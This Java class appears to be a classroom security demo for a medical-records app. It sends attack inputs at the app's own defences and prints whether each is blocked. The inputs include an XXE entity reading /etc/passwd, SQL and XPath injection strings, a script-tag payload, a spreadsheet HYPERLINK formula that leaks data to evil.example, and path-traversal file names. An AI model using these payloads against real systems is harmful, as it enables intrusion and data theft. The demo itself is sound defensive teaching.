package medvault.app;

import medvault.access.Permission;
import medvault.auth.CredentialsConfig;
import medvault.model.AccessDeniedException;
import medvault.model.LabReport;
import medvault.model.Patient;
import medvault.model.Role;
import medvault.model.Session;
import medvault.model.User;
import medvault.model.ValidationException;
import medvault.security.CryptoService;
import medvault.security.IntegrityHasher;
import medvault.security.KeyProvider;
import medvault.security.TokenGenerator;
import org.w3c.dom.Document;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.function.Supplier;
import java.util.logging.Handler;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

/**
 * The in-class demo: one story in which an attacker tries to break into
 * MedVault and each layer stops a different attack, while a legitimate
 * nurse gets her work done.
 *
 * <p>Each step prints a header, then one line per attempt:
 * {@code [OK] ALLOWED <what>} (green) or {@code [X] BLOCKED <what> -> <reason>}
 * (red). An unexpected failure prints {@code [ERROR] <what> -> <message>},
 * with the user-safe message from {@link medvault.audit.ErrorHandler}. With
 * {@link Options#verbose()} the audit lines each attempt produced are shown
 * beneath it; with {@link Options#pause()} the demo waits for Enter between
 * steps.</p>
 *
 * <p>Setup (before step 1): the bootstrap admin logs in with the password
 * from {@code MEDVAULT_ADMIN_PASSWORD}, creates a nurse and a doctor, the
 * doctor creates three charts, and the care team is assigned. Demo account
 * passwords are random per run, so none is written in the source
 * (CWE-798).</p>
 *
 * @author MedVault team
 */
public final class DemoScenario {

    /** Presentation switches, set from the command line by {@link Main}. */
    public static final class Options {
        private final boolean color;
        private final boolean verbose;
        private final boolean pause;

        /**
         * @param color   ANSI green/red output
         * @param verbose show the audit lines under each attempt
         * @param pause   wait for Enter between steps
         */
        public Options(boolean color, boolean verbose, boolean pause) {
            this.color = color;
            this.verbose = verbose;
            this.pause = pause;
        }

        /** @return colour on, audit lines hidden, no pauses */
        public static Options defaults() {
            return new Options(true, false, false);
        }

        /** @return true for ANSI colour */
        public boolean color() {
            return color;
        }

        /** @return true to show audit lines */
        public boolean verbose() {
            return verbose;
        }

        /** @return true to wait for Enter between steps */
        public boolean pause() {
            return pause;
        }
    }

    /** One step of the story; it prints its own result lines. */
    @FunctionalInterface
    interface Step {
        /** Runs the step. */
        void run() throws Exception;
    }

    /** One action inside a step; its return value, if any, is ignored. */
    @FunctionalInterface
    interface Action {
        /** Performs the attempt. */
        void run() throws Exception;
    }

    private static final String GREEN = "\u001B[32m";
    private static final String RED = "\u001B[31m";
    private static final String BOLD = "\u001B[1m";
    private static final String DIM = "\u001B[2m";
    private static final String RESET = "\u001B[0m";
    // Plain ASCII only, so every Windows console shows them without changing the code page.
    private static final String OK = "[OK]";
    private static final String X = "[X]";
    private static final String ERROR = "[ERROR]";
    private static final String ARROW = "->";

    private static final String NURSE = "nurse.joy";
    private static final String NEW_NURSE = "nurse.ben";
    private static final String DOCTOR = "dr.grey";

    private final MedVaultApp app;
    private final Options options;
    private final PrintStream out;
    private final BufferedReader in;
    private final TokenGenerator random = new TokenGenerator();
    private final List<String> titles = new ArrayList<>();
    private final List<Step> steps = new ArrayList<>();
    /** Audit lines produced by the current attempt, printed after its result line in verbose mode. */
    private final List<String> pendingAudit = Collections.synchronizedList(new ArrayList<>());

    private int allowedCount;
    private int blockedCount;
    private int errorCount;
    /** Cleared when stdin reaches end of input, so a non-interactive run doesn't stall. */
    private boolean pausing = true;

    // State built by setup and the steps, in story order.
    private Session admin;
    private Session doctor;
    private Session nurse;
    private char[] nursePassword;
    private char[] newNursePassword;
    private long alice;
    private long bob;
    private long carol;
    private Document imported;
    private LabReport uploaded;

    /** @param app the wired application; default options, prints to {@code System.out} */
    public DemoScenario(MedVaultApp app) {
        this(app, Options.defaults(), System.out, System.in);
    }

    /**
     * @param app     the wired application
     * @param options colour, verbosity and pausing
     * @param out     where the story is printed
     * @param in      where Enter is read from when pausing
     */
    public DemoScenario(MedVaultApp app, Options options, PrintStream out, InputStream in) {
        this.app = Objects.requireNonNull(app, "app");
        this.options = Objects.requireNonNull(options, "options");
        this.out = Objects.requireNonNull(out, "out");
        this.in = new BufferedReader(new InputStreamReader(Objects.requireNonNull(in, "in"), Charset.defaultCharset()));
        define();
    }

    private void add(String title, Step step) {
        titles.add(title);
        steps.add(step);
    }

    /** Admin, nurse, doctor, three charts and their care teams. */
    private void setup() {
        attempt("admin signs in with the password from MEDVAULT_ADMIN_PASSWORD", () -> {
            char[] adminPassword = CredentialsConfig.fromEnvironment().adminPassword();
            try {
                admin = app.auth().login(MedVaultApp.ADMIN_USERNAME, adminPassword);
            } finally {
                Arrays.fill(adminPassword, '\0');
            }
        });
        attempt("admin creates " + NURSE + " (NURSE) and " + DOCTOR + " (DOCTOR) with random passwords", () -> {
            nursePassword = newPassword();
            char[] doctorPassword = newPassword();
            createAccount(NURSE, nursePassword, Role.NURSE);
            createAccount(DOCTOR, doctorPassword, Role.DOCTOR);
            doctor = app.auth().login(DOCTOR, doctorPassword);
        });
        attempt(DOCTOR + " creates charts for Alice Example, Bob Sample and Carol Test", () -> {
            alice = app.patients().add(doctor, new Patient(0, "Alice Example", LocalDate.of(1980, 1, 31), DOCTOR,
                    "Type 2 diabetes; metformin 500 mg twice daily.")).getId();
            bob = app.patients().add(doctor, new Patient(0, "Bob Sample", LocalDate.of(1975, 6, 15), DOCTOR,
                    "Hypertension; lisinopril 10 mg.")).getId();
            carol = app.patients().add(doctor, new Patient(0, "Carol Test", LocalDate.of(1992, 9, 3), DOCTOR,
                    "Annual physical, no concerns.")).getId();
        }, () -> "charts #" + alice + ", #" + bob + ", #" + carol);
        attempt("assign the care team", () -> {
            app.careTeam().assign(alice, DOCTOR);
            app.careTeam().assign(alice, NURSE);
            app.careTeam().assign(bob, DOCTOR);
            app.careTeam().assign(carol, DOCTOR);
            app.careTeam().assign(carol, NURSE);
        }, () -> DOCTOR + " on all three; " + NURSE + " on #" + alice + " and #" + carol + " only");
    }

    private void define() {
        // Ian: CWE-521, 916, 620, 307, 613
        add("Admin creates nurse account with a weak password (CWE-521, CWE-620)", () -> {
            for (String weak : List.of("Summer26!", "Nurse.Ben-2026-ok", "password1234")) {
                attempt("create " + NEW_NURSE + " with password \"" + weak + "\"",
                        () -> createAccount(NEW_NURSE, weak.toCharArray(), Role.NURSE));
            }
            attempt("create " + NEW_NURSE + " with a random 43-character password", () -> {
                newNursePassword = newPassword();
                createAccount(NEW_NURSE, newNursePassword, Role.NURSE);
            }, () -> "stored as a salted PBKDF2 hash, 210,000 rounds");
            char[] changed = newPassword();
            attempt(NEW_NURSE + "'s password is changed without the right current password (CWE-620)",
                    () -> app.auth().changePassword(NEW_NURSE, "Not-her-password-123".toCharArray(), changed));
            attempt(NEW_NURSE + " changes her password, giving the current one first (CWE-620)", () -> {
                app.auth().changePassword(NEW_NURSE, newNursePassword, changed);
                newNursePassword = changed;
            });
        });
        add("Attacker brute-forces the nurse's login and gets locked out (CWE-307)", () -> {
            for (int i = 1; i <= 5; i++) {
                attempt("guess " + i + " of 5 at " + NEW_NURSE + "'s password",
                        () -> app.auth().login(NEW_NURSE, "Guess-number-1234".toCharArray()));
            }
            attempt("the REAL password, now that the account is locked for 15 minutes",
                    () -> app.auth().login(NEW_NURSE, newNursePassword));
            attempt("log in as a user that doesn't exist (same message, so usernames can't be probed)",
                    () -> app.auth().login("no.such.user", "Guess-number-1234".toCharArray()));
        });
        // Martin: CWE-306, 639, 283, 266, 842, 1220
        add("Nurse logs in and changes the patient id to open another chart (CWE-639)", () -> {
            attempt(NURSE + " logs in", () -> nurse = app.auth().login(NURSE, nursePassword));
            attempt(NURSE + " opens chart #" + alice + " (her patient)",
                    () -> app.patients().findById(nurse, alice).orElseThrow());
            attempt(NURSE + " changes the id to chart #" + bob + " (not her patient)",
                    () -> app.patients().findById(nurse, bob));
            attempt("open chart #" + bob + " with a forged session token (CWE-306)", () -> {
                Session forged = new Session(random.newSessionToken(), new User(DOCTOR, Role.DOCTOR),
                        nurse.getExpiresAt());
                app.patients().findById(forged, bob);
            });
            attempt("open chart #" + bob + " with her real token, claiming to be " + DOCTOR, () -> {
                Session wrapped = new Session(nurse.getToken(), new User(DOCTOR, Role.DOCTOR), nurse.getExpiresAt());
                app.patients().findById(wrapped, bob);
            });
        });
        add("Nurse tries to promote herself to ADMIN (CWE-266)", () -> {
            attempt(NURSE + " promotes herself to ADMIN", () -> app.roles().changeRole(nurse, NURSE, Role.ADMIN));
            attempt(DOCTOR + " (not an admin) grants " + NURSE + " the DOCTOR role (CWE-266)",
                    () -> app.roles().changeRole(doctor, NURSE, Role.DOCTOR));
            attempt("admin changes their own role to DOCTOR",
                    () -> app.roles().changeRole(admin, MedVaultApp.ADMIN_USERNAME, Role.DOCTOR));
            attempt("admin promotes " + NURSE + " to ADMIN (CWE-842)",
                    () -> app.roles().changeRole(admin, NURSE, Role.ADMIN));
            attempt("admin moves " + NEW_NURSE + " from NURSE to DOCTOR",
                    () -> app.roles().changeRole(admin, NEW_NURSE, Role.DOCTOR));
            attempt("admin opens chart #" + alice + " (CWE-1220)", () -> app.patients().findById(admin, alice));
        });
        // James: CWE-89, 79, 611, 1236, 502, 78
        add("Search for \"' OR 1=1 --\" returns nothing extra (CWE-89)", () -> {
            searchExpectingNothing("search for \"' OR 1=1 --\"", "' OR 1=1 --",
                    "0 charts; the input is sent as data, never as SQL");
            searchExpectingNothing("search for \"%\" to match every name", "%",
                    "0 charts; % is escaped and matched literally");
            searchExpectingNothing("search for \"Bob\" (a real patient, not hers)", "Bob",
                    "0 charts; results are filtered by care team");
            List<Patient> hits = new ArrayList<>();
            attempt("search for \"Alice\"", () -> hits.addAll(app.patients().searchByName(nurse, "Alice")),
                    () -> hits.size() + " chart" + (hits.size() == 1 ? "" : "s") + " found"
                            + (hits.isEmpty() ? "" : ", #" + hits.get(0).getId()));
        });
        add("Import an XML file with an external entity (CWE-611)", () -> {
            attempt(NURSE + " imports records from another clinic",
                    () -> app.access().require(nurse, Permission.IMPORT_RECORDS));
            String xxe = "<?xml version=\"1.0\"?>\n<!DOCTYPE patients [<!ENTITY secret SYSTEM \"file:///etc/passwd\">]>\n"
                    + "<patients><patient id=\"9\"><name>&secret;</name><dob>1990-01-01</dob>"
                    + "<attending>dr.grey</attending></patient></patients>";
            attempt(DOCTOR + " imports a file with <!ENTITY secret SYSTEM \"file:///etc/passwd\">", () -> {
                app.access().require(doctor, Permission.IMPORT_RECORDS);
                app.importer().parse(utf8(xxe));
            });
            String clean = "<patients><patient id=\"9\"><name>Dan Import</name><dob>1990-01-01</dob>"
                    + "<attending>dr.grey</attending><notes>Transferred from Eastside Clinic.</notes></patient>"
                    + "<patient id=\"10\"><name>Erin Import</name><dob>1985-05-05</dob>"
                    + "<attending>dr.grey</attending></patient></patients>";
            attempt(DOCTOR + " imports a clean file with 2 patients", () -> {
                app.access().require(doctor, Permission.IMPORT_RECORDS);
                imported = app.importer().parse(utf8(clean));
            });
            List<Patient> found = new ArrayList<>();
            attempt("look up \"Dan Import\" in the imported file",
                    () -> found.addAll(app.importer().findByName(imported, "Dan Import")),
                    () -> found.size() + " match");
            String injection = "x' or '1'='1";
            int leaked = app.importer().findByName(imported, injection).size();
            if (leaked == 0) {
                blocked("look up \"" + injection + "\" to match every patient",
                        "0 matches; the input is bound as an XPath variable");
            } else {
                allowed("look up \"" + injection + "\" to match every patient: " + leaked + " matches");
            }
        });
        add("Export a chart whose notes contain <script> or a spreadsheet formula (CWE-79, CWE-1236)", () -> {
            Patient chart = app.patients().findById(doctor, carol).orElseThrow();
            String payload = "<script>alert('pwned')</script> BP 120/80";
            attempt(NURSE + " edits chart #" + carol + "'s notes", () -> app.patients().update(nurse, chart.withNotes(payload)));
            attempt(DOCTOR + " (attending) saves notes containing " + payload,
                    () -> app.patients().update(doctor, chart.withNotes(payload)));
            String[] html = {""};
            attempt(DOCTOR + " exports chart #" + carol + " as HTML", () -> {
                app.access().require(doctor, Permission.EXPORT_CHART);
                html[0] = app.exporter().toHtml(app.patients().findById(doctor, carol).orElseThrow());
            });
            if (!html[0].isEmpty()) {
                String notes = html[0].substring(html[0].indexOf("<pre>") + 5, html[0].indexOf("</pre>"));
                if (html[0].contains("<script")) {
                    allowed("run <script> in the exported page");
                } else {
                    blocked("run <script> in the exported page", "escaped and shown as text: " + notes);
                }
            }
            String formula = "=HYPERLINK(\"http://evil.example/?leak=\"&A2,\"Lab results\")";
            attempt(DOCTOR + " saves notes containing " + formula,
                    () -> app.patients().update(doctor, chart.withNotes(formula)));
            String[] csv = {""};
            attempt(DOCTOR + " exports chart #" + carol + " to CSV", () -> {
                app.access().require(doctor, Permission.EXPORT_CHART);
                csv[0] = app.exporter().toCsv(List.of(app.patients().findById(doctor, carol).orElseThrow()));
            });
            if (!csv[0].isEmpty()) {
                String what = "run =HYPERLINK(...) when the CSV is opened in a spreadsheet (CWE-1236)";
                if (csv[0].contains("\"=HYPERLINK")) {
                    allowed(what);
                } else {
                    blocked(what, "cell starts with ' so it shows as text: '=HYPERLINK(...)");
                }
            }
        });
        // Alex: CWE-434, 22, 770, 378, 276, 772
        add("Upload an .exe renamed to report.pdf (CWE-434)", () -> {
            byte[] exe = {'M', 'Z', (byte) 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0, (byte) 0xFF, (byte) 0xFF};
            attempt("upload a Windows .exe (MZ header) named report.pdf to chart #" + alice,
                    () -> app.labs().upload(nurse, alice, "report.pdf", new ByteArrayInputStream(exe)));
            attempt("upload a real PDF to chart #" + bob + " (not her patient)",
                    () -> app.labs().upload(nurse, bob, "labs.pdf", utf8(minimalPdf())));
            attempt("upload a real PDF to chart #" + alice,
                    () -> uploaded = app.labs().upload(nurse, alice, "cbc-results.pdf", utf8(minimalPdf())),
                    () -> "stored as " + uploaded.getStoredName() + ", " + uploaded.getSizeBytes()
                            + " bytes; the client's file name is not used");
        });
        add("Download ../../etc/passwd (CWE-22)", () -> {
            for (String evil : List.of("../../etc/passwd", "..\\..\\Windows\\win.ini", "/etc/passwd")) {
                attempt("download \"" + evil + "\"", () -> app.labs().download(nurse, evil).close());
            }
            Objects.requireNonNull(uploaded, "step 8 must store a report first");
            byte[][] bytes = {new byte[0]};
            attempt("download her own report " + uploaded.getStoredName(), () -> {
                try (InputStream report = app.labs().download(nurse, uploaded.getStoredName())) {
                    bytes[0] = report.readAllBytes();
                }
            }, () -> bytes[0].length + " bytes, starts with "
                    + new String(bytes[0], 0, Math.min(5, bytes[0].length), StandardCharsets.US_ASCII));
        });
        // Jimmy: CWE-1204, 328, 338, 117, 779, 778
        add("Every note gets a fresh IV, and integrity hashes use SHA-256 (CWE-1204, CWE-328)", () -> {
            // Same key the app loaded at startup (MEDVAULT_RECORD_KEY).
            CryptoService crypto = new CryptoService(new KeyProvider().loadRecordKey(), new TokenGenerator());
            String note = "Pt reports chest pain; ECG ordered.";
            String first = crypto.encrypt(note);
            String second = crypto.encrypt(note);
            allowed("encrypt a note before it is stored " + ARROW + " " + first.substring(0, 24) + "...");
            if (first.equals(second)) {
                allowed("spot patients with the same note by comparing ciphertext");
            } else {
                blocked("spot patients with the same note by comparing ciphertext (CWE-1204)",
                        "fresh 12-byte SecureRandom IV, so the same note encrypts differently every time");
            }
            if (note.equals(crypto.decrypt(first))) {
                allowed("decrypt with the record key from MEDVAULT_RECORD_KEY");
            } else {
                error("decrypt with the record key from MEDVAULT_RECORD_KEY", "decrypted text differs");
            }
            byte[] forged = Base64.getDecoder().decode(first);
            forged[forged.length - 20] ^= 0x01; // attacker flips one bit of the stored ciphertext
            try {
                crypto.decrypt(Base64.getEncoder().encodeToString(forged));
                allowed("flip one bit of the stored ciphertext");
            } catch (SecurityException rejected) {
                blocked("flip one bit of the stored ciphertext", "AES-GCM integrity check failed");
            }
            IntegrityHasher sha256 = new IntegrityHasher();
            byte[] report = minimalPdf().getBytes(StandardCharsets.US_ASCII);
            allowed("fingerprint a lab report with " + sha256.algorithm() + " " + ARROW + " "
                    + sha256.hashHex(report).substring(0, 16) + "...");
            for (String weak : List.of("MD5", "SHA-1")) {
                String what = "fingerprint it with " + weak + " instead (CWE-328)";
                try {
                    new IntegrityHasher(weak);
                    allowed(what);
                } catch (IllegalArgumentException refused) {
                    blocked(what, refused.getMessage());
                }
            }
        });
        add("Username with a newline can't forge a log line (CWE-117)", () -> {
            String attack = "bob\n2026-11-04 INFO actor=admin action=LOGIN_OK";
            List<String> written = new ArrayList<>();
            Handler capture = new Handler() {
                @Override
                public void publish(LogRecord record) {
                    written.add(record.getMessage());
                }

                @Override
                public void flush() {
                }

                @Override
                public void close() {
                }
            };
            Logger auditLog = Logger.getLogger("medvault.audit");
            auditLog.addHandler(capture);
            try {
                app.audit().record(null, "LOGIN_FAILED", "username=" + attack);
            } finally {
                auditLog.removeHandler(capture);
            }
            String line = written.isEmpty() ? "" : written.get(0);
            String what = "log in as \"bob\\n2026-11-04 INFO actor=admin action=LOGIN_OK\" to forge a log line";
            if (line.contains("\n") || line.contains("\r")) {
                allowed(what);
            } else {
                blocked(what, "newline escaped as \\n; " + written.size() + " audit line written");
            }
        });
    }

    /** Runs setup and every step in order, printing each attempt's outcome. */
    public void run() {
        Logger auditLog = Logger.getLogger("medvault.audit");
        Handler echo = new Handler() {
            @Override
            public void publish(LogRecord record) {
                pendingAudit.add(record.getMessage());
            }

            @Override
            public void flush() {
            }

            @Override
            public void close() {
            }
        };
        // Audit lines never reach the console handler during the demo; in verbose mode
        // they are printed under the attempt that produced them.
        boolean parents = auditLog.getUseParentHandlers();
        auditLog.setUseParentHandlers(false);
        if (options.verbose()) {
            auditLog.addHandler(echo);
        }
        try {
            header("Setup");
            runStep(this::setup);
            for (int i = 0; i < steps.size(); i++) {
                pause(i + 1);
                header(String.format("Step %d/%d  %s", i + 1, steps.size(), titles.get(i)));
                runStep(steps.get(i));
            }
            out.println();
            out.println(paint(BOLD, "Done: " + blockedCount + " blocked, " + allowedCount + " allowed"
                    + (errorCount > 0 ? ", " + errorCount + " errors" : "")));
        } finally {
            auditLog.removeHandler(echo);
            auditLog.setUseParentHandlers(parents);
            out.flush();
        }
    }

    private void runStep(Step step) {
        try {
            step.run();
        } catch (Exception e) {
            error("step stopped", app.errors().toUserMessage(e));
        }
        printPendingAudit();
    }

    /**
     * Runs one attempt and prints {@code ALLOWED} if it succeeded, {@code BLOCKED}
     * with the user-safe reason if MedVault refused it, or {@code ERROR}.
     */
    private void attempt(String what, Action action) {
        attempt(what, action, null);
    }

    /** As {@link #attempt(String, Action)}, adding {@code detail} to the ALLOWED line. */
    private void attempt(String what, Action action, Supplier<String> detail) {
        try {
            action.run();
        } catch (AccessDeniedException | ValidationException refused) {
            blocked(what, refused.getMessage());
            return;
        } catch (Exception e) {
            error(what, app.errors().toUserMessage(e));
            return;
        }
        allowed(detail == null ? what : what + " " + ARROW + " " + detail.get());
    }

    /** A search that should come back empty: empty means BLOCKED, anything else ALLOWED. */
    private void searchExpectingNothing(String what, String text, String reason) {
        int[] hits = {0};
        try {
            hits[0] = app.patients().searchByName(nurse, text).size();
        } catch (AccessDeniedException | ValidationException refused) {
            blocked(what, refused.getMessage());
            return;
        } catch (Exception e) {
            error(what, app.errors().toUserMessage(e));
            return;
        }
        if (hits[0] == 0) {
            blocked(what, reason);
        } else {
            allowed(what + " " + ARROW + " " + hits[0] + " charts returned");
        }
    }

    private void allowed(String what) {
        allowedCount++;
        result(GREEN, OK + " ALLOWED", what);
    }

    private void blocked(String what, String reason) {
        blockedCount++;
        result(RED, X + " BLOCKED", what + " " + ARROW + " " + reason);
    }

    private void error(String what, String reason) {
        errorCount++;
        result(RED, ERROR, what + " " + ARROW + " " + reason);
    }

    private void result(String colour, String tag, String text) {
        out.println("  " + paint(colour, tag) + " " + text);
        printPendingAudit();
    }

    private void header(String title) {
        out.println();
        out.println(paint(BOLD, title));
    }

    /** In verbose mode, prints the audit lines collected since the last result line. */
    private void printPendingAudit() {
        List<String> lines;
        synchronized (pendingAudit) {
            lines = new ArrayList<>(pendingAudit);
            pendingAudit.clear();
        }
        for (String line : lines) {
            out.println("        " + paint(DIM, "audit: " + line));
        }
    }

    /** With --pause, waits for Enter before the given step; stops pausing at end of input. */
    private void pause(int nextStep) {
        if (!options.pause() || !pausing) {
            return;
        }
        out.print(paint(DIM, "  [Enter] for step " + nextStep + " "));
        out.flush();
        try {
            if (in.readLine() == null) {
                pausing = false; // no console attached: run the rest without waiting
                out.println();
            }
        } catch (IOException e) {
            pausing = false;
        }
    }

    private String paint(String code, String text) {
        return options.color() ? code + text + RESET : text;
    }

    /** The admin flow: only a MANAGE_USERS session may create accounts. */
    private void createAccount(String username, char[] password, Role role) {
        app.access().require(admin, Permission.MANAGE_USERS);
        app.auth().register(username, password, role);
    }

    /** A random demo password, so no credential is written in the source (CWE-798). */
    private char[] newPassword() {
        return random.newSessionToken().toCharArray();
    }

    private static InputStream utf8(String s) {
        return new ByteArrayInputStream(s.getBytes(StandardCharsets.UTF_8));
    }

    private static String minimalPdf() {
        return "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
                + "2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n";
    }
}
